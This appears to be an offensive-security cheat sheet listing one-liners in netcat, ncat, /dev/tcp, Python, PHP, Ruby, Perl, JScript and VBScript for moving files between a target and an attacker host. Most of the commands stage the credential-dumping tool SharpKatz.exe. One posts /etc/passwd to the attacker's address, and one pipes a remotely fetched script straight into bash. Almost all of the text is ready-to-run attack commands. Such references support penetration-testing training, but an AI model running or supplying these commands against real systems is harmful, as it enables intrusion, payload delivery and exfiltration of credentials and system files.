> Useful when certain commands are blocked

Can find more at [gtfobins file download](https://gtfobins.github.io/#+file%20download) and [gtfobins file upload](https://gtfobins.github.io/#+file%20upload)

# Netcat

## Listener on target

```sh
nc -lp 8000 > SharpKatz.exe
```

Attacker send file

```sh
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

## Listener on attacker

```sh
nc -lp 8000 -q 0 < SharpKatz.exe
```

Target receive file

```sh
nc 192.168.49.128 8000 > SharpKatz.exe
```

# Ncat

## Listener on target


```sh
ncat -lp --recv-only 8000 > SharpKatz.exe
```

Attacker send file

```sh
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

## Listener on attacker

```sh
ncat -lp --send-only 8000 -q 0 < SharpKatz.exe
```

Target receive file

```sh
ncat --recv-only 192.168.49.128 8000 > SharpKatz.exe
```

# `/dev/tcp`

Print what received and also write to file

```sh
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

# Python

## Download

Python2.7

```sh
python2.7 -c 'import urllib;urllib.urlretrieve ("https://10.0.0.1/file.sh", "file.sh")'
```

Python3

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://10.0.0.1/file.sh", "file.sh")'
```

## Upload

```sh
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

# PHP

```sh
php -r '$file = file_get_contents("https://10.0.0.1/file.sh"); file_put_contents("file.sh",$file);'
```

Use fopen

```sh
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://10.0.0.1/file.sh", "rb"); $flocal = fopen("file.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Fileless to bash

```sh
php -r '$lines = @file("https://10.0.0.1/file.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

# Ruby

```sh
ruby -e 'require "net/http"; File.write("file.sh", Net::HTTP.get(URI.parse("https://10.0.0.1/file.sh")))'
```

# Perl

```sh
perl -e 'use LWP::Simple; getstore("https://10.0.0.1/file.sh", "file.sh");'
```

# Javascript (WHY)

`download.js`

```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

```powershell
cscript.exe /nologo download.js https://10.0.0.1/file.ps1 file.ps1
```

# VBScript

`download.vbs`

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```powershell
cscript.exe /nologo download.vbs https://10.0.0.1/file.ps1 file.ps1
```